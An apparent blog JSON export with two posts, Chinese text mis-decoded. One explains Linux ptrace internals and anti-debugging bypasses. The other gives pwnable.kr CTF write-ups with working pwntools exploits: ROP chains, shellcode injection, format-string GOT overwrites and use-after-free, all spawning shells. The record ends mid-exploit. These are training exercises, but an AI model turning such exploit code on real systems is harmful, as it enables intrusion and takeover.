{"meta":{"title":"Firework","subtitle":"","description":"Less_is_more","author":"Firework","url":"http://example.com","root":"/"},"pages":[{"title":"åˆ†ç±»","date":"2021-04-08T07:14:19.440Z","updated":"2021-04-08T07:14:19.423Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"å‹æƒ…é“¾æ¥","date":"2021-04-08T07:15:38.000Z","updated":"2021-04-08T07:16:14.735Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"æ ‡ç­¾","date":"2021-04-18T02:39:43.930Z","updated":"2021-04-08T07:13:42.893Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"PtraceåŸç†ä¸åè°ƒè¯•","slug":"PtraceåŸç†ä¸åè°ƒè¯•","date":"2022-03-25T14:33:05.012Z","updated":"2022-03-25T16:52:01.651Z","comments":true,"path":"2022/03/25/PtraceåŸç†ä¸åè°ƒè¯•/","link":"","permalink":"http://example.com/2022/03/25/Ptrace%E5%8E%9F%E7%90%86%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95/","excerpt":"","text":"ptracedefinition123456789101112131415161718The ptrace() system call provides a means by which one process(the &quot;tracer&quot;) may observe and control the execution of anotherprocess (the &quot;tracee&quot;), and examine and change the tracee&#39;smemory and registers. It is primarily used to implementbreakpoint debugging and system call tracing.A tracee first needs to be attached to the tracer. Attachmentand subsequent commands are per thread: in a multithreadedprocess, every thread can be individually attached to a(potentially different) tracer, or left not attached and thus notdebugged. Therefore, &quot;tracee&quot; always means &quot;(one) thread&quot;, never&quot;a (possibly multithreaded) process&quot;. Ptrace commands are alwayssent to a specific tracee using a call of the form ptrace(PTRACE_foo, pid, ...)where pid is the thread ID of the corresponding Linux thread. arguments &amp; descriptions1long ptrace(enum __ptrace_request request, pid_t pid,void *addr, void *data); request ï¼šrequestçš„å€¼ç¡®å®šè¦æ‰§è¡Œçš„æ“ä½œï¼Œå¯ä»¥å–ä»¥ä¸‹å€¼ 1234567891011121314151617PTRACE_TRACEME, æœ¬è¿›ç¨‹è¢«å…¶çˆ¶è¿›ç¨‹æ‰€è·Ÿè¸ªã€‚å…¶çˆ¶è¿›ç¨‹åº”è¯¥å¸Œæœ›è·Ÿè¸ªå­è¿›ç¨‹PTRACE_PEEKTEXT, ä»å†…å­˜åœ°å€ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå†…å­˜åœ°å€ç”±addrç»™å‡ºPTRACE_PEEKDATA, åŒä¸ŠPTRACE_PEEKUSER, å¯ä»¥æ£€æŸ¥ç”¨æˆ·æ€å†…å­˜åŒºåŸŸ(USER area),ä»USERåŒºåŸŸä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œåç§»é‡ä¸ºaddrPTRACE_POKETEXT, å¾€å†…å­˜åœ°å€ä¸­å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚å†…å­˜åœ°å€ç”±addrç»™å‡ºPTRACE_POKEDATA, å¾€å†…å­˜åœ°å€ä¸­å†™å…¥ä¸€ä¸ªå­—èŠ‚ã€‚å†…å­˜åœ°å€ç”±addrç»™å‡ºPTRACE_POKEUSER, å¾€USERåŒºåŸŸä¸­å†™å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œåç§»é‡ä¸ºaddrPTRACE_GETREGS, è¯»å–å¯„å­˜å™¨PTRACE_GETFPREGS, è¯»å–æµ®ç‚¹å¯„å­˜å™¨PTRACE_SETREGS, è®¾ç½®å¯„å­˜å™¨PTRACE_SETFPREGS, è®¾ç½®æµ®ç‚¹å¯„å­˜å™¨PTRACE_CONT, é‡æ–°è¿è¡ŒPTRACE_SYSCALL, ä½¿è¢«è°ƒè¯•è¿›ç¨‹ç»§ç»­è¿è¡Œ,ä½†æ˜¯åœ¨ä¸‹ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„å…¥å£å¤„æˆ–å‡ºå£å¤„åœä¸‹,æˆ–è€…æ˜¯æ‰§è¡Œå®Œä¸€æ¡æŒ‡ä»¤ååœä¸‹.ä¾‹å¦‚,è°ƒè¯•è¿›ç¨‹å¯ä»¥ç›‘è§†è¢«è°ƒè¯•è¿›ç¨‹ç³»ç»Ÿè°ƒç”¨å…¥å£å¤„çš„å‚æ•°,æ¥ç€å†ä½¿ç”¨SYSCALL,ç›‘è§†ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼.PTRACE_SINGLESTEP, è®¾ç½®å•æ­¥æ‰§è¡Œæ ‡å¿—PTRACE_ATTACHï¼Œè¿½è¸ªæŒ‡å®špidçš„è¿›ç¨‹PTRACE_DETACHï¼Œ ç»“æŸè¿½è¸ª ç¬¬äºŒå‚æ•° pid ï¼šæŒ‡ç¤ºptraceè¦è·Ÿè¸ªçš„è¿›ç¨‹ã€‚ ç¬¬ä¸‰å‚æ•° addr ï¼šæŒ‡å®šptraceè¦è¯»å–orç›‘æ§çš„å†…å­˜åœ°å€ã€‚ ç¬¬å››å‚æ•° data ï¼šå¦‚æœæˆ‘ä»¬è¦å‘ç›®æ ‡è¿›ç¨‹å†™å…¥æ•°æ®ï¼Œé‚£ä¹ˆdataæ˜¯æˆ‘ä»¬è¦å†™å…¥çš„æ•°æ®ï¼›å¦‚æœæˆ‘ä»¬ä»ç›®æ ‡è¿›ç¨‹ä¸­è¯»å‡ºæ•°æ®ï¼Œé‚£ä¹ˆè¯»å‡ºçš„æ•°æ®æ”¾åœ¨dataã€‚ demo: 1234567891011121314151617181920212223242526272829303132333435#include &lt;sys/ptrace.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/reg.h&gt; /* For constants ORIG_RAX etc */#include &lt;stdio.h&gt;int main()&#123; char * argv[ ]=&#123;&quot;ls&quot;,&quot;-al&quot;,&quot;/etc/passwd&quot;,(char *)0&#125;; char * envp[ ]=&#123;&quot;PATH=/bin&quot;,0&#125;; pid_t child; long orig_rax; child = fork(); if(child == 0) &#123; ptrace(PTRACE_TRACEME, 0, NULL, NULL); printf(&quot;Try to call: execl\\n&quot;); execve(&quot;/bin/ls&quot;,argv,envp); printf(&quot;child exit\\n&quot;); &#125; else &#123; wait(NULL); //ç­‰å¾…å­è¿›ç¨‹ orig_rax = ptrace(PTRACE_PEEKUSER, child, 8 * ORIG_RAX, NULL); printf(&quot;The child made a &quot; &quot;system call %ld\\n&quot;, orig_rax); ptrace(PTRACE_CONT, child, NULL, NULL); printf(&quot;Try to call:ptrace\\n&quot;); &#125; return 0;&#125; ptraceå·¥ä½œåŸç† é€šè¿‡ copy_from_user copy_to_user è¯»å–ä¸ä¿®æ”¹æ•°æ®ã€‚ é€šè¿‡ copy_regset_from/to_user è®¿é—®å¯„å­˜å™¨ã€‚è€Œå¯„å­˜å™¨æ•°æ®ä¿å­˜åœ¨ task struct ä¸­ã€‚ å•æ­¥ï¼ˆSingle Steppingï¼‰ï¼šæ¯æ­¥è¿›(step)ä¸€æ¬¡ï¼ŒCPUä¼šä¸€ç›´æ‰§è¡Œåˆ°æœ‰åˆ†æ”¯ã€ä¸­æ–­æˆ–å¼‚å¸¸ã€‚è€Œptraceé€šè¿‡è®¾ç½®å¯¹åº”çš„æ ‡å¿—ä½åœ¨è¿›ç¨‹çš„thread_info.flagså’ŒMSRä¸­æ‰“æ ‡å¯ç”¨å•æ­¥è°ƒè¯•ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253void user_enable_single_step(struct task_struct *child)&#123; enable_step(child, 0);&#125;/* * Enable single or block step. */static void enable_step(struct task_struct *child, bool block)&#123; /* * Make sure block stepping (BTF) is not enabled unless it should be. * Note that we don&#x27;t try to worry about any is_setting_trap_flag() * instructions after the first when using block stepping. * So no one should try to use debugger block stepping in a program * that uses user-mode single stepping itself. */ if (enable_single_step(child) &amp;&amp; block) set_task_blockstep(child, true); else if (test_tsk_thread_flag(child, TIF_BLOCKSTEP)) set_task_blockstep(child, false);&#125;åœ¨ enable_single_step ä¸­è®¾ç½®äº† X86_EFLAGS_TF ä»¥åŠ TIF_SINGLESTEP æ ‡å¿—ä½ã€‚ åœ¨ test_tsk_thread_flag ä¸­æ£€æŸ¥äº†å¯¹åº”è¿›ç¨‹ thread_infoä¸­çš„ TIF_BLOCKSTEP æ ‡å¿—ä½ã€‚void set_task_blockstep(struct task_struct *task, bool on)&#123; unsigned long debugctl; local_irq_disable(); debugctl = get_debugctlmsr(); if (on) &#123; debugctl |= DEBUGCTLMSR_BTF; set_tsk_thread_flag(task, TIF_BLOCKSTEP); &#125; else &#123; debugctl &amp;= ~DEBUGCTLMSR_BTF; clear_tsk_thread_flag(task, TIF_BLOCKSTEP); &#125; if (task == current) update_debugctlmsr(debugctl); local_irq_enable();&#125;æ¥ä¸‹æ¥åœ¨ set_task_blockstep ä¸­è®¾ç½®æˆ–æ¸…é™¤äº† DEBUGCTLMSR_BTF ä»¥åŠ å¯¹åº”thread infoçš„ TIF_BLOCKSTEP ã€‚ breakpointsåŸç†breakpointså¹¶ä¸æ˜¯ptraceçš„å®ç°çš„ä¸€éƒ¨åˆ†ã€‚å¹¶ä¸”ï¼Œå½“å¤„äºattachå’ŒtracemeçŠ¶æ€ä¸‹ï¼Œäº¤ä»˜ç»™traceeçš„ä»»ä½•ä¿¡å·é¦–å…ˆéƒ½ä¼šè¢«GDBæˆªè·ã€‚ é‚£ä¹ˆGDBä¼šåšå¦‚ä¸‹äº‹æƒ…ã€‚ 1.è¯»å–addrå¤„çš„æŒ‡ä»¤çš„ä½ç½®ï¼Œå­˜å…¥GDBç»´æŠ¤çš„æ–­ç‚¹é“¾è¡¨ä¸­ã€‚ 2.å°†ä¸­æ–­æŒ‡ä»¤ INT 3 ï¼ˆ0xCCï¼‰æ‰“å…¥åŸæœ¬çš„addrå¤„ã€‚ä¹Ÿå°±æ˜¯å°†addrå¤„çš„æŒ‡ä»¤æ‰æ¢æˆINT 3 3.å½“æ‰§è¡Œåˆ°addrå¤„ï¼ˆINT 3ï¼‰æ—¶ï¼ŒCPUæ‰§è¡Œè¿™æ¡æŒ‡ä»¤çš„è¿‡ç¨‹ä¹Ÿå°±æ˜¯å‘ç”Ÿæ–­ç‚¹å¼‚å¸¸ï¼ˆbreakpoint exceptionï¼‰ï¼Œtraceeäº§ç”Ÿä¸€ä¸ªSIGTRAPï¼Œæ­¤æ—¶æˆ‘ä»¬å¤„äºattachæ¨¡å¼ä¸‹ï¼Œtraceeçš„SIGTRAPä¼šè¢«tracerï¼ˆGDBï¼‰æ•æ‰ã€‚ç„¶åGDBå»ä»–ç»´æŠ¤çš„æ–­ç‚¹é“¾è¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„ä½ç½®ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œè¯´æ˜hitåˆ°äº†breakpointã€‚ 4.æ¥ä¸‹æ¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦traceeç»§ç»­æ­£å¸¸è¿è¡Œï¼ŒGDBå°†INT 3æŒ‡ä»¤æ¢å›åŸæ¥æ­£å¸¸çš„æŒ‡ä»¤ï¼Œå›é€€é‡æ–°è¿è¡Œæ­£å¸¸æŒ‡ä»¤ï¼Œç„¶åæ¥ç€è¿è¡Œã€‚ watchpointï¼ˆç¡¬ä»¶æ–­ç‚¹ï¼‰åŸç†åœ¨GDBä¸­å¦ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„æ˜¯watchå‘½ä»¤ã€‚ç”¨äºç›‘æ§æŸä¸€å†…å­˜ä½ç½®æˆ–è€…å¯„å­˜å™¨çš„å˜åŒ–. watchçš„å®ç°ä¸CPUçš„ç›¸å…³å¯„å­˜å™¨æœ‰å…³ã€‚æˆ‘ä»¬ä»¥80386ä¸ºä¾‹ã€‚ å­˜åœ¨DR0åˆ°DR7è¿™å…«ä¸ªç‰¹æ®Šçš„å¯„å­˜å™¨æ¥å®ç°ç¡¬ä»¶æ–­ç‚¹ã€‚ ï¼ˆ1ï¼‰DR0-DR3ï¼šæ¯ä¸ªå¯„å­˜å™¨éƒ½ä¿å­˜ç€å¯¹åº”æ¡ä»¶æ–­ç‚¹çš„çº¿æ€§åœ°å€ã€‚è€Œæ¯ä¸ªæ–­ç‚¹æ›´è¿›ä¸€æ­¥çš„ä¿¡æ¯å‚¨å­˜åœ¨DR7ä¸­ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºå‚¨å­˜çš„æ˜¯çº¿æ€§åœ°å€ï¼Œæ‰€ä»¥æ˜¯å¦å¼€å¯åˆ†é¡µæ˜¯ä¸å½±å“çš„ã€‚å¦‚æœå¼€å¯pagingï¼Œé‚£ä¹ˆçº¿æ€§åœ°å€ç”±mmuè½¬æ¢åˆ°ç‰©ç†åœ°å€ï¼›å¦åˆ™çº¿æ€§åœ°å€ä¸ç‰©ç†åœ°å€ç­‰æ•ˆã€‚ ï¼ˆ2ï¼‰DR7 è°ƒè¯•æ§åˆ¶å¯„å­˜å™¨debug controlï¼šDR7çš„ä½å…«ä½ï¼ˆ0ã€2ã€4ã€6å’Œ1ã€3ã€5ã€7ï¼‰æœ‰é€‰æ‹©åœ°å¯ç”¨å››ä¸ªæ¡ä»¶æ–­ç‚¹ã€‚å¯ç”¨çº§åˆ«æœ‰ä¸¤ä¸ªï¼šæœ¬åœ°ï¼ˆ0,2,4,6ï¼‰å’Œå…¨å±€ï¼ˆ1,3,5,7ï¼‰ã€‚å¤„ç†å™¨ä¼šåœ¨æ¯ä¸ªä»»åŠ¡åˆ‡æ¢æ—¶è‡ªåŠ¨é‡ç½®æœ¬åœ°å¯ç”¨ä½ï¼Œä»¥é¿å…åœ¨æ–°ä»»åŠ¡ä¸­å‡ºç°ä¸å¿…è¦çš„æ–­ç‚¹æƒ…å†µã€‚å…¨å±€å¯ç”¨ä½ä¸ä¼šç”±ä»»åŠ¡å¼€å…³é‡ç½®ï¼›å› æ­¤ï¼Œå®ƒä»¬å¯ä»¥ç”¨äºæ‰€æœ‰ä»»åŠ¡çš„å…¨å±€æ¡ä»¶ã€‚ 16-17ä½ï¼ˆå¯¹åº”äºDR0ï¼‰ï¼Œ20-21ï¼ˆDR1ï¼‰ï¼Œ24-25ï¼ˆDR2ï¼‰ï¼Œ28-29ï¼ˆDR3ï¼‰å®šä¹‰äº†æ–­ç‚¹è§¦å‘çš„æ—¶é—´ã€‚æ¯ä¸ªæ–­ç‚¹éƒ½æœ‰ä¸€ä¸ªä¸¤ä½å¯¹åº”ï¼Œç”¨äºæŒ‡å®šå®ƒä»¬æ˜¯åœ¨æ‰§è¡Œï¼ˆ00bï¼‰ï¼Œæ•°æ®å†™å…¥ï¼ˆ01bï¼‰ï¼Œæ•°æ®è¯»å–è¿˜æ˜¯å†™å…¥ï¼ˆ11bï¼‰æ—¶ä¸­æ–­ã€‚10bè¢«å®šä¹‰ä¸ºè¡¨ç¤ºIOè¯»å–æˆ–å†™å…¥ä¸­æ–­ï¼Œä½†æ²¡æœ‰ç¡¬ä»¶æ”¯æŒå®ƒã€‚ä½18-19ï¼ˆDR0ï¼‰ï¼Œ22-23ï¼ˆDR1ï¼‰ï¼Œ26-27ï¼ˆDR2ï¼‰ï¼Œ30-31ï¼ˆDR3ï¼‰å®šä¹‰äº†æ–­ç‚¹ç›‘è§†å¤šå¤§çš„å†…å­˜åŒºåŸŸã€‚åŒæ ·ï¼Œæ¯ä¸ªæ–­ç‚¹éƒ½æœ‰ä¸€ä¸ªä¸¤ä½å¯¹åº”ï¼ŒæŒ‡å®šä»–ä»¬watchä¸€ä¸ªï¼ˆ00bï¼‰ï¼Œä¸¤ä¸ªï¼ˆ01bï¼‰ï¼Œå…«ï¼ˆ10bï¼‰è¿˜æ˜¯å››ï¼ˆ11bï¼‰ä¸ªå­—èŠ‚ã€‚ ï¼ˆ3ï¼‰DR6 è°ƒè¯•çŠ¶æ€å¯„å­˜å™¨ï¼šå‘Šè¯‰è°ƒè¯•å™¨å“ªäº›æ–­ç‚¹å·²ç»å‘ç”Ÿäº†ã€‚ åè°ƒè¯•é€šè¿‡åŸºäºptraceçš„GDBæˆ‘ä»¬å¯ä»¥å¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼Œé‚£ä¹ˆä¸ºäº†é˜²æ­¢åˆ«äººè°ƒè¯•æˆ‘ä»¬çš„ç¨‹åºï¼Œä¹Ÿå°±æœ‰äº†åè°ƒè¯•æŠ€æœ¯ã€‚ ç«äº‰è°ƒè¯•&amp;ç»•è¿‡æ€è·¯123456789101112#include &lt;sys/ptrace.h&gt;#include &lt;stdio.h&gt;int main()&#123; if (ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1 ) &#123; printf(&quot;don&#x27;t trace me:(\\n&quot;); return 1; &#125; printf(&quot;no one trace me:)\\n&quot;); return 0;&#125; å½“æˆ‘ä»¬è°ƒè¯•è¯¥ç¨‹åºçš„æ—¶å€™ï¼Œgdbå·²ç»é™„åŠ åœ¨è¯¥è¿›ç¨‹ï¼Œå†æ¬¡æ‰§è¡Œptrace(PTRACE_TRACEME, 0, 0, 0)æ—¶ï¼Œç”±äºæ¯ä¸ªè¿›ç¨‹åªèƒ½è¢«PTRACE_TRACEMEä¸€æ¬¡ï¼Œå› æ­¤åªè¦ç¨‹åºçš„å¼€å¤´å°±å…ˆæ‰§è¡Œä¸€æ¬¡ptrace(PTRACE_TRACEME, 0, 0, 0)ï¼Œå½“gdbå†æƒ³attachçš„æ—¶å€™å°±ä¼šå‘ç°å·²ç»æ‰§è¡Œäº†ä¸€æ¬¡ä¸èƒ½å†æ‰§è¡Œäº†ä»è€Œè¿”å›-1ã€‚ è§£å†³æ€è·¯ï¼š patchæ‰ç¨‹åºä¸­ptraceç¨‹åº åˆ©ç”¨hookæ›¿æ¢ptraceä¸ºè‡ªå®šä¹‰å‡½æ•° ç”¨gdbçš„catchå‘½ä»¤,catch syscall ptraceä¼šåœ¨å‘ç”Ÿptraceè°ƒç”¨çš„æ—¶å€™åœä¸‹ï¼Œå› æ­¤åœ¨ç¬¬äºŒæ¬¡åœä½çš„æ—¶å€™set $rax=0ï¼Œä»è€Œç»•è¿‡ç¨‹åºä¸­ptrace(PTRACE_TRACEME, 0, 0, 0) ==-1çš„åˆ¤æ–­ã€‚","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"}]},{"title":"Pwnable_2_Rookiss","slug":"Pwnable_2_Rookiss","date":"2021-10-17T17:24:39.000Z","updated":"2022-03-25T16:53:03.000Z","comments":true,"path":"2021/10/18/Pwnable_2_Rookiss/","link":"","permalink":"http://example.com/2021/10/18/Pwnable_2_Rookiss/","excerpt":"","text":"unlinkè¿œç¨‹æœåŠ¡å™¨exp æœ¬åœ°ubuntu exp brain fuckdo_brainfuckç¨‹åºå¯¹æŒ‡é’ˆpè¿›è¡Œæ“ä½œï¼Œå¯ä»¥åŸºäºæ­¤è¿›è¡Œgotè¡¨çš„è¦†ç›– å°†mensetè¦†ç›–ä¸ºgetsï¼Œå°†fgetsè¦†ç›–ä¸ºsystem md5 calculatorâ€‹ canaryç”±äºsand()ä¼ªéšæœºæ€§å¯¼è‡´çš„æ³„éœ²ï¼Œåˆ©ç”¨æ­¤ROP python3 1234567891011121314151617181920212223242526272829303132333435363738394041424344import timeimport ctypesimport base64from pwn import *context.arch = &#x27;i386&#x27;context.log_level = &#x27;debug&#x27;print (int(time.time()))#p = process(&#x27;./hash&#x27;)now = int(time.time())+1p = remote(&#x27;pwnable.kr&#x27;, 9002)print (now)t = process(&#x27;./get_time&#x27;)t.sendline(str(now))v = t.recvline().decode().split(&#x27;,&#x27;)v = [&#x27;0&#x27;, &#x27;0&#x27;] + v[:-1]for i in range(len(v)): v[i] = int(v[i])t.close()p.recvline()captcha = p.recvline().decode().split(&#x27;:&#x27;)[1][1:-1]p.sendline(captcha)canary = int(captcha)-v[6]+v[8]-v[9]-v[4]+v[5]-v[3]-v[7]canary = ctypes.c_uint(canary).valueprint (canary)p.recvline()p.recvline()#gdb.attach(p)payload = b&#x27;&#x27;payload +=b&#x27;A&#x27;*0x200payload += p32(canary)payload += b&#x27;B&#x27;*0xcpayload += p32(0x08048880) # system pltpayload += b&#x27;a&#x27;*4 #The system() function has a feature that takes an argument from a distance of +4Bytes away.Very Important.payload += p32(0x0804B3E0) # g_bufpayload = base64.b64encode(payload)payload += b&#x27;\\x00&#x27;*(0x300-len(payload))payload +=b&#x27;/bin//sh&#x27;p.sendline(payload)p.interactive() simple loginjust like flag says: 1control EBP, control ESP, control EIP, control the world~ åªèƒ½æ§åˆ¶ebpçš„æƒ…å†µä¸‹: leaveæŒ‡ä»¤å®Œæˆä»¥ä¸‹å†…å®¹ï¼š mov esp,ebp pop ebp å®Œæˆæ ˆå¸§æ¢å¤ æ­¤året= pop eipæˆåŠŸæ§åˆ¶è¿”å›åœ°å€ 12345payload = &#x27;&#x27;payload += p32(0)payload += p32(0x08049284)payload += p32(0x0811EB40)payload = b64encode(payload) optlearn about ulimit ascii_easyROPgadgetçš„è¿›é˜¶ç”¨æ³• 1ROPgadget --offset 0x5555e000 --badbytes &quot;00-1f|80-ff&quot; --ropchain --binary libc-2.15.so &gt; out.txt one_gadgetä¸»è¦ç”¨æ¥å»æŸ¥æ‰¾åŠ¨æ€é“¾æ¥åº“é‡Œexecve(â€œ/bin/shâ€, rsp+0x70, environ)å‡½æ•°çš„åœ°å€ one_gadgetè¿›é˜¶ç”¨æ³• https://bbs.pediy.com/thread-261112.htm soåº“åŠ è½½åœ°å€ 0x5555e000 æ€è·¯ï¼š æ—¢ç„¶ç»™å®šçš„soåº“æ˜¯å¯å†™å¯æ‰§è¡Œçš„ï¼Œå¯ä»¥åˆ©ç”¨ ROPgadgetæ‹¼æ¥write1æˆ–write2å°†shellcodeå†™å…¥soåº“ä¸ŠæŒ‡å®šåœ°å€ã€‚æœ€åå°†æ§åˆ¶æµè·³è½¬åˆ°è¯¥åœ°å€æ‰§è¡Œã€‚ æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„write2 æ‰¾åˆ°pop edxå’Œxor eax eax æ‰¾åˆ°ç”¨äºè„å­—ç¬¦å¤„ç†çš„gadget å‡†å¤‡å·¥ä½œç»“æŸ: exp å…³é”®åœ¨äºè„å­—ç¬¦å¤„ç† 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.arch &#x3D; &#39;i386&#39;context.log_level &#x3D; &#39;debug&#39;def write_one(addr, c): w &#x3D; &#39;&#39; w +&#x3D; p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret w +&#x3D; p32(addr) # edx w +&#x3D; p32(0x20202020) # edi w +&#x3D; p32(0x55615d44) # pop eax ; cmp eax, 0xfffff001 ; jae 0xb7d55 ; ret if 0x20 &lt;&#x3D; ord(c) &lt;&#x3D;0x7f: w +&#x3D; c + &#39;\\x20\\x20\\x20&#39; # eax elif ord(c) &lt; 0x20: t &#x3D; chr(ord(c)+0x100-0x5f-0x5f) w +&#x3D; t + &#39;\\x20\\x20\\x20&#39; # eax w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret elif ord(c) &gt; 0x7f: if ord(c)-0x5f &lt;&#x3D; 0x7f: t &#x3D; chr(ord(c)-0x5f) w +&#x3D; t + &#39;\\x20\\x20\\x20&#39; # eax w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret else: t &#x3D; chr(ord(c)-0x5f-0x5f) w +&#x3D; t + &#39;\\x20\\x20\\x20&#39; # eax w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret w +&#x3D; p32(0x555e7a4c) # add al, 0x5f ; ret w +&#x3D; p32(0x555e3773) # mov word ptr [edx], ax ; mov eax, edx ; ret return wshellcode &#x3D; &#39;&#39;shellcode +&#x3D; &#39;\\x31\\xd2&#39; # xor edx, edxshellcode +&#x3D; &#39;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69&#39;shellcode +&#x3D; &#39;\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80&#39;payload &#x3D; &#39;&#39;payload +&#x3D; &#39;A&#39;*0x20start_addr &#x3D; 0x55606055for i in range(len(shellcode)): payload +&#x3D; write_one(start_addr+i, shellcode[i])payload +&#x3D; p32(start_addr)p &#x3D; process([&#39;.&#x2F;ascii_easy&#39;, payload])p.interactive() tiny_easyç¨‹åºè·³è½¬ argv[0]å‰å››ä¸ªå­—èŠ‚åœ°å€ï¼Œé€šè¿‡è®¾ç½®executableå‚æ•°ï¼Œå¯ä»¥è‡ªå®šä¹‰argv[0]ã€‚è¿›è€Œå¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚ executable (str) â€“ Path to the binary to execute. If None, uses argv[0]. Cannot be used with shell. 1234567891011from pwn import *payload &#x3D; &quot;\\x90&quot; * 8000 + shellcraft.sh()arg &#x3D; [p32(0xffeec9d4)]for i in range(1,0x100): arg.append(payload)while True: p &#x3D; process(arg, executable&#x3D;&quot;.&#x2F;tiny_easy&quot;) p.interactive()#What a tiny task :) good job! fsbEz Format String 1Have you ever saw an example of utilizing [n] format character?? :( å­˜åœ¨è·³æ¿æŒ‡é’ˆçš„åˆ†æå¦‚ä¸‹ æ ˆä¸Šæœ‰æŒ‡å‘ç¯å¢ƒå˜é‡åœ°å€å’Œargvçš„æŒ‡é’ˆï¼Œè€Œç¯å¢ƒå˜é‡å’Œå‚æ•°å·²ç»è¢«ç½®ç©ºæ‰€ä»¥å­˜åœ¨è¿™ä¸¤ä¸ªè·³æ¿æŒ‡é’ˆã€‚ æ€è·¯1 è¦†å†™printfçš„Gotè¡¨(0x804a004)ä¸ºexecveåœ°å€(0x80486ab)å³å¯ 1234.&#x2F;fsb &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1%134520836c%14$n%134514347c%20$n æ€è·¯2 ä¿®æ”¹keyå€¼ä¸º0 12345678910111213141516171819202122from pwn import *context.arch = &#x27;i386&#x27;fmt1 = &#x27;%&#x27; + str(0x0804A060) + &#x27;c%14$n&#x27;fmt2 = &#x27;%&#x27; + str(0x0804A064) + &#x27;c%15$n&#x27;write1 = &#x27;%20$n&#x27;write2 = &#x27;%21$n&#x27;p = process(&#x27;/home/fsb/fsb&#x27;)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(fmt1)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(write1)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(fmt2)p.recvuntil(&#x27;)\\n&#x27;)p.sendline(write2)p.recvuntil(&#x27;key : \\n&#x27;)p.sendline(&#x27;0&#x27;)p.interactive() dragonEz æ•´æ•°æº¢å‡º+UAF 1234567891011121314151617181920212223242526from pwn import *context.arch = &#x27;i386&#x27;context.log_level = &#x27;debug&#x27;#p = process(&#x27;./dragon&#x27;)p = remote(&#x27;pwnable.kr&#x27;, 9004)p.recvuntil(&#x27;Knight\\n&#x27;)p.sendline(&#x27;1&#x27;)for i in xrange(2): p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;1&#x27;)p.recvuntil(&#x27;Knight\\n&#x27;)p.sendline(&#x27;1&#x27;)for i in xrange(4): p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;3&#x27;) p.recvuntil(&#x27;Invincible.\\n&#x27;) p.sendline(&#x27;2&#x27;)p.recvuntil(&#x27;As:\\n&#x27;)p.sendline(p32(0x08048DBF))p.interactive() fixå¾ˆå·§å¦™çš„æ ˆå¸§ç»“æ„åˆ†æï¼Œç”±äºespé è¿‘shellcodeï¼Œåœ¨æ­£å¸¸æ‰§è¡Œshellcodeçš„è¿‡ç¨‹ä¸­å †æ ˆæ“ä½œä¿®æ”¹äº†æ”¾æœ‰shellcodeçš„æ•°ç»„ã€‚ å°†push eax æ”¹ä¸ºleaveå³å¯ï¼Œä½†æ˜¯ä¼šé€ æˆexecveå‡½æ•°æ‰§è¡Œæ—¶å‚æ•°å‹æ ˆæœ‰é—®é¢˜ï¼Œä¼ å…¥çš„å‚æ•°ä¸æ˜¯ /bin/sh å¯ä»¥é€šè¿‡åˆ›å»ºå¯¹åº”æ–‡ä»¶ï¼Œå°†shå¡«å…¥æ–‡ä»¶å³å¯ 1234567891011121314151617181920212223from pwn import *context.log_level=&#x27;debug&#x27;a=process(&quot;/home/fix/fix&quot;)a.recv()a.sendline(&#x27;15&#x27;)a.sendline(&#x27;201&#x27;)a.recvuntil(&quot;get shell\\n&quot;)error=a.recvline()#print(error)m = error.find(&#x27;open &#x27;)fname = error[m+5:-1]f = open(fname,&#x27;w&#x27;)f.write(&#x27;sh\\n&#x27;)f.close()a=process(&quot;/home/fix/fix&quot;)a.recv()a.sendline(&#x27;15&#x27;)a.sendline(&#x27;201&#x27;)a.interactive() syscallç”±äºå†…æ ¸ç³»ç»Ÿè°ƒç”¨æœªé™åˆ¶å¯è®¿é—®çš„å†…å­˜åœ°å€å¼•èµ·çš„å†…æ ¸æ¼æ´ï¼Œåˆ©ç”¨æ€è·¯ï¼š æ–¹æ³•ä¸€æ‰‹æ’¸æ±‡ç¼–ï¼Œæ±‡ç¼–å‡ºcommit_creds(prepare_kernel_cred(0)) çš„ä¸åŒ…å«å°å†™å­—æ¯çš„æ±‡ç¼–ä»£ç  1234567891011121314.data:00000008 b501 push &#123;r0, lr&#125; .data:0000000a 1a92 subs r2, 